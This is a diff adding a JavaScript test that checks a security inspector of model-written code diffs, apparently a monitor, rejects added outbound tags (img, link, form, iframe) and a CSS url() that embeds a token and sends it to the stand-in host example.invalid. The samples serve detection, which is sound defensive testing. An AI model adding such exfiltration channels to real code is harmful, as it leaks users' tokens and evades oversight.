@@ -57,6 +57,18 @@ test('security rejects browser side-channel exfiltration and navigation addition
   }
 });
 
+test('security rejects newly added outbound markup and CSS, including multiline JSX', () => {
+  for (const addition of [
+    '+<img src={unsafeUrl} />',
+    '+<a href={unsafeUrl}>Open</a>',
+    '+<form action={unsafeUrl}>Send</form>',
+    '+<iframe\\n+ src={unsafeUrl} />',
+    '+const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };'
+  ]) {
+    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
+  }
+});
+
 test('security refuses removal of existing feedback authentication and ownership guards', () => {
   const protectedSource = [
     'const auth = await supabase.auth.getUser();',
